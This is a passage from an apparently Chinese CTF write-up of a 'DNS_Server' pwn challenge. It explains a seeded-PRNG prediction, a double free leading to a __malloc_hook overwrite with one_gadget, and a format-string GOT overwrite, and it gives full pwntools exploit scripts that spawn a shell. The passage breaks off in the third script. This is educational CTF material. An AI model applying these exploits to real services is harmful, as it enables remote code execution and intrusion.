href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">代码</a>参考了pwnable.kr中题目的代码，但里面的漏洞和逻辑bug被我修复了，每一轮游戏可以下注，当达到一定分数时，可以拿到加密后的flag，此题问题在于初始化中调用了srand(time(0)/60)作为伪随机种子，只要在与服务器上程序启动的一分钟以内去生成随机数都是可以正确预测随机数的。相当于可以预测扑克牌生成的序列，当预测到这一轮电脑会赢的时候就下注$1，预测自己会赢的话就全部下注，过不了几轮就可以拿到加密后的flag，解密就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">last = list()</span><br><span class="line"></span><br><span class="line">ori = <span class="number">-1</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">libc=CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>)/<span class="number">60</span>)</span><br><span class="line">p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b set_motto\nb set_name')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.20.11'</span>,  <span class="number">2111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randcard</span><span class="params">(dealer)</span>:</span></span><br><span class="line"><span class="keyword">global</span> last,ori</span><br><span class="line"><span class="keyword">if</span> len(last)&gt;<span class="number">0</span>:</span><br><span class="line">num = last[<span class="number">0</span>]%<span class="number">13</span>+<span class="number">1</span></span><br><span class="line">last = last[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ori = libc.rand()</span><br><span class="line">num = ori%<span class="number">13</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> num &gt;= <span class="number">12</span>:</span><br><span class="line">num = <span class="number">10</span></span><br><span class="line"><span class="keyword">elif</span> num == <span class="number">11</span>:</span><br><span class="line"><span class="keyword">if</span> dealer&lt;=<span class="number">10</span>:</span><br><span class="line">num = <span class="number">11</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num = num</span><br><span class="line"><span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> ori</span><br><span class="line">player = <span class="number">0</span></span><br><span class="line">dealer = <span class="number">0</span></span><br><span class="line">player_flag = <span class="number">0</span></span><br><span class="line">dealer_flag = <span class="number">0</span></span><br><span class="line">Hit = <span class="number">0</span></span><br><span class="line">Stay = <span class="number">0</span></span><br><span class="line">getrand()<span class="comment">#,last</span></span><br><span class="line">player+=randcard(player)</span><br><span class="line"><span class="comment">#print '--'</span></span><br><span class="line">p.recvuntil(<span class="string">'Your Total is '</span>)</span><br><span class="line">tmp =int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> (tmp!= player):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] rand num1 wrong !with %d vs %d'</span>%(tmp,player)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'The Dealer Has a Total of '</span>)</span><br><span class="line">dealer+=randcard(dealer)</span><br><span class="line">tmp =int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> (tmp!= dealer):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] rand num2 wrong !%d vs %d'</span>%(tmp,dealer)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> player == <span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]1 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> player&lt;=<span class="number">21</span>:</span><br><span class="line"><span class="keyword">if</span> player_flag!=<span class="number">1</span>:</span><br><span class="line">card_type = getrand()</span><br><span class="line">card_num  = randcard(player)</span><br><span class="line"><span class="keyword">if</span> (player + card_num )&lt;=<span class="number">21</span>:</span><br><span class="line">player+=card_num</span><br><span class="line">Hit +=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">last.append(card_type)</span><br><span class="line">last.append(ori)</span><br><span class="line">player_flag =<span class="number">1</span></span><br><span class="line">Stay = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dealer&lt;<span class="number">17</span>:</span><br><span class="line">dealer += randcard(dealer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dealer==<span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]2 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> dealer&gt;<span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]3 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> dealer&lt;<span class="number">17</span>:</span><br><span class="line">dealer += randcard(dealer)</span><br><span class="line"><span class="keyword">if</span> dealer&gt;=<span class="number">17</span>:</span><br><span class="line"><span class="keyword">if</span> player&gt;=dealer:</span><br><span class="line"><span class="comment">#print '[+++]4 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> player&lt;dealer:</span><br><span class="line"><span class="comment">#print '[+++]5 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>,Hit,Stay</span><br><span class="line"><span class="keyword">if</span> dealer&gt;<span class="number">21</span>:</span><br><span class="line"><span class="comment">#print '[+++]6 d,p',dealer,player,last</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>,Hit,Stay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (p.recvuntil(Your Total is ))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrand</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> last_two,last</span><br><span class="line"><span class="keyword">if</span> len(last)&gt;<span class="number">0</span>:</span><br><span class="line">num = last[<span class="number">0</span>]</span><br><span class="line">last = last[<span class="number">1</span>:]</span><br><span class="line"><span class="comment">#print '[***]',last</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num = libc.rand()</span><br><span class="line"><span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">win = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xbabe</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Y/N'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">if win&gt;=6:</span></span><br><span class="line"><span class="string">p.recvuntil('flag :')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag = p.recv()</span></span><br><span class="line"><span class="string">flag_decrypt = ""</span></span><br><span class="line"><span class="string">for i in range(len(flag)):</span></span><br><span class="line"><span class="string">flag_decrypt += chr((getrand()%256)^ord(flag[i]))</span></span><br><span class="line"><span class="string">print flag_decrypt</span></span><br><span class="line"><span class="string">exit(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">")b"</span> <span class="keyword">in</span> p.recvuntil(<span class="string">":"</span>):</span><br><span class="line">p.recvuntil(<span class="string">'flag :\n'</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">flag_decrypt = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">flag_decrypt += chr((getrand()%<span class="number">256</span>)^ord(flag[i]))</span><br><span class="line"><span class="keyword">print</span> flag_decrypt</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">' $'</span>)</span><br><span class="line">money = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">result,hit,stay = round()</span><br><span class="line"><span class="keyword">if</span> result :</span><br><span class="line">p.recvuntil(<span class="string">"$"</span>)</span><br><span class="line">p.sendline(str(money))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,hit):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"H"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,stay):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"S"</span>)</span><br><span class="line"><span class="comment">#win+=1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.recvuntil(<span class="string">"$"</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,hit):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"H"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,stay):</span><br><span class="line">p.recvuntil(<span class="string">"Please Enter H to Hit or S to Stay."</span>)</span><br><span class="line">p.sendline(<span class="string">"S"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please Enter Y for Yes or N for No\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p>题目中有一个增加DNS和删除DNS的功能，在删除功能中按照domain名进行查找并Free，但仅把最后一个DNS节点指针置空，因此，两次Delete会造成Double Free。但是题目中我设置了一个坑点，在于DNS节点Free以前会检查是否是当前用户释放的，也就是name字段，当简单的double free时，由于fd指针位置已经被置为某地址了，所以不能通过检查而释放，此时发现检查字段用的是strcmp来比较的，将name字段设置为‘\x00’*7即可通过检查。比较简单的libc泄露地址方法是用unsorted bin未清空来做，泄露main_arena+88这个地址。以后的方法是常规套路：将Double Free转换为UAF，形成循环链表，劫持长度为0x70的fastbin链到__malloc_hook-0x30，以one_gadget覆写__malloc_hook，在申请堆块时候触发malloc从而拿到shell。</p><p><strong>另外，堆漏洞由于我写错了一个函数，出现了一个堆溢出漏洞，膜一发以非预期解法解出题目的师傅</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.20.11'</span>,  <span class="number">2111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(domain,length,remark,ip)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line">p.recvuntil(<span class="string">"length"</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">p.sendline(remark)</span><br><span class="line">p.recvuntil(<span class="string">"IP:"</span>)</span><br><span class="line">p.send(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">delete(<span class="string">"leak"</span>)</span><br><span class="line">show(<span class="string">"leak"</span>)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">libc.address  = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">heap =u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap:'</span>,hex(heap)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name"</span>)</span><br><span class="line">p.sendline(<span class="string">'\0'</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step1"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">add(<span class="string">"step1"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">delete(<span class="string">"step1"</span>)</span><br><span class="line">delete(<span class="string">"step1"</span>)</span><br><span class="line">delete(<span class="string">"leak"</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step2"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,(p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)+<span class="string">"..."</span>).ljust(<span class="number">0x20</span>,<span class="string">'1'</span>))</span><br><span class="line">add(<span class="string">"step3"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'3'</span>))</span><br><span class="line">add(<span class="string">"step3"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'3'</span>))</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="string">"step4"</span>,<span class="number">0x40</span>,<span class="string">"p4nda"</span>,(<span class="string">"\0"</span>*<span class="number">0x13</span>+p64(libc.address +<span class="number">0x4526a</span> )+<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'0'</span>)))</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="格式化字符串大礼包"><a href="#格式化字符串大礼包" class="headerlink" title="格式化字符串大礼包"></a>格式化字符串大礼包</h2><p>在set_name函数中有一个明显的格式化字符串漏洞，这个漏洞很多队伍拿来做地址泄露了，实际上也是可用的。首先七个字节，可用来写本函数中的rbp，向该位置用%hn写2字节\x00。在写完之后，在login函数的栈就被迁移到原来的栈的低地址位置了，而在set_motto函数中可以对这部分内存预先设置一下，可以达到控制scanf格式化字符串的目的，将这个格式化字符串劫持到堆上去，泄露堆地址的方法与Double Free中泄露方法是一致的，达到控制格式化字符串以后，需要考虑如何将scanf的格式化字符串用好。与格式化字符串在堆或bss段上的printf格式化字符串利用思路类似，可以在栈上先找一个地址链，向第一个地址写入，再对第二个地址写入，从而达到任意地址写，最终劫持puts@got 为system，以show_motto函数触发漏洞就可以拿到shell了。</p><p>利用流程是：以堆泄露libc、堆地址-&gt;在堆上预先布置好scanf格式化字符串-&gt;以set_motto预先布置好栈上数据-&gt;调用set_name对login函数做栈迁移-&gt;利用login函数的scanf写got表-&gt;触发show_motto函数拿到shell</p><p><strong><em>这个就是一个简化版本的胖哈勃题目，出在这里想看一下有什么解法是我非预期的，当时线下赛的时候没有人用这个方法来做，还是没有想到上面提到的那个劫持返回地址…</em></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./DNS_Server'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./DNS_Server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span 